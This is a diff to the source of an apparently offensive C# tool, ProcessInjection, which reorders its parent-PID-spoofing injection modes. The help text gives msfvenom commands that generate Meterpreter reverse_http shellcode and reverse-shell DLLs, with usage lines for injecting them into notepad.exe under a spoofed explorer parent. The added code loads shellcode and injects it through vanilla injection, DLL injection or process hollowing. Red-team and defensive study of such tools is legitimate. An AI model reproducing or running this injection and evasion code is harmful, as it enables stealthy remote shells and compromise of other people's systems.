@@ -783,7 +783,7 @@ namespace ProcessInjection
     2) hex
     3) C
 
-[+] Currently the tool support 1 evade technique.
+[+] Supports 1 detection evading technique.
     1) Parent PID Spoofing
 
 [+] Generating shellcode in base64 format and injecting it in the target process.
@@ -808,23 +808,22 @@ namespace ProcessInjection
 [+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
 [+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /f:c /t:3
 
-[+]
-[+] Evade Technique
-[+]
-[+] Parent PID Spoofing with Process Hollowing.
-[+] Generating shellcode in c format and injecting it in the target process.
-[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
+[+] Detection Evading Technique
 
 [+] Parent PID Spoofing with Vanila Process Injection.
 [+] Generating shellcode in c format and injecting it in the target process.
 [+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:5
+[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:4
 
 [+] Parent PID Spoofing with DLL Injection.
 [+] Generating DLL and injecting it in the target process.
 [+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f dll > Desktop/reverse_shell.dll
-[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\reverse_shell.dll"" /parentproc:explorer /t:6
+[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\reverse_shell.dll"" /parentproc:explorer /t:5
+
+[+] Parent PID Spoofing with Process Hollowing.
+[+] Generating shellcode in c format and injecting it in the target process.
+[+] msfvenom -p windows/meterpreter/reverse_http exitfunc=thread LHOST=<> LPORT=<> -b ""\x00"" -f c
+[+] ProcessInjection.exe /ppath:""C:\Windows\System32\notepad.exe"" /path:""C:\Users\User\Desktop\shellcode.txt"" /parentproc:explorer /f:c /t:6
 
 ";
             Console.WriteLine(help);
@@ -922,6 +921,42 @@ namespace ProcessInjection
                         }
                         else if (arguments["/t"]  == "4")
                         {
+                            Console.WriteLine($"[+] Parent Process Spoofing with Vanila Process Injection Technique.");
+                            ParentPidSpoofing Parent = new ParentPidSpoofing();
+                            string ppid = null;
+                            int parentProc = 0;
+                            ppid = Convert.ToString(arguments["/parentproc"]);
+                            parentProc = Parent.SearchForPPID(ppid);
+                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
+                            byte[] buf = new byte[] { };
+                            if (arguments["/f"] == "base64")
+                            {
+                                buf = Convert.FromBase64String(shellcode);
+                            }
+                            else if (arguments["/f"] == "hex")
+                            {
+                                buf = StringToByteArray(shellcode);
+                            }
+                            else if (arguments["/f"] == "c")
+                            {
+                                buf = convertfromc(shellcode);
+                            }
+                            PPIDCodeInject(arguments["/ppath"], buf, parentProc);
+                        }
+                        else if (arguments["/t"] == "5")
+                        {
+                            Console.WriteLine($"[+] Parent Process Spoofing with DLL Process Injection Technique.");
+                            ParentPidSpoofing Parent = new ParentPidSpoofing();
+                            string ppid = null;
+                            int parentProc = 0;
+                            ppid = Convert.ToString(arguments["/parentproc"]);
+                            parentProc = Parent.SearchForPPID(ppid);
+                            var dllpath = arguments["/path"];
+                            byte[] buf = Encoding.Default.GetBytes(dllpath);
+                            PPIDDLLInject(arguments["/ppath"], buf, parentProc);
+                        }
+                        else if (arguments["/t"] == "6")
+                        {
                             Console.WriteLine($"[+] Parent Process Spoofing with Process Hollowing Injection Technique.");
                             ParentPidSpoofing Parent = new ParentPidSpoofing();
                             string ppid = null;
@@ -943,47 +978,8 @@ namespace ProcessInjection
                             {
                                 buf = convertfromc(shellcode);
                             }
-
                             Parent.PPidSpoof(arguments["/ppath"], buf, parentProc);
                         }
-                        else if (arguments["/t"] == "5")
-                        {
-                            Console.WriteLine($"[+] Parent Process Spoofing with Vanila Process Injection Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
-                            var shellcode = System.IO.File.ReadAllText(arguments["/path"]);
-                            byte[] buf = new byte[] { };
-                            if (arguments["/f"] == "base64")
-                            {
-                                buf = Convert.FromBase64String(shellcode);
-                            }
-                            else if (arguments["/f"] == "hex")
-                            {
-                                buf = StringToByteArray(shellcode);
-                            }
-                            else if (arguments["/f"] == "c")
-                            {
-                                buf = convertfromc(shellcode);
-                            }
-
-                            PPIDCodeInject(arguments["/ppath"], buf, parentProc);
-                        }
-                        else if (arguments["/t"] == "6")
-                        {
-                            Console.WriteLine($"[+] Parent Process Spoofing with DLL Process Injection Technique.");
-                            ParentPidSpoofing Parent = new ParentPidSpoofing();
-                            string ppid = null;
-                            int parentProc = 0;
-                            ppid = Convert.ToString(arguments["/parentproc"]);
-                            parentProc = Parent.SearchForPPID(ppid);
-                            var dllpath = arguments["/path"];
-                            byte[] buf = Encoding.Default.GetBytes(dllpath);
-                            PPIDDLLInject(arguments["/ppath"], buf, parentProc);
-                        }
-                        
                     }
                     else
                     {
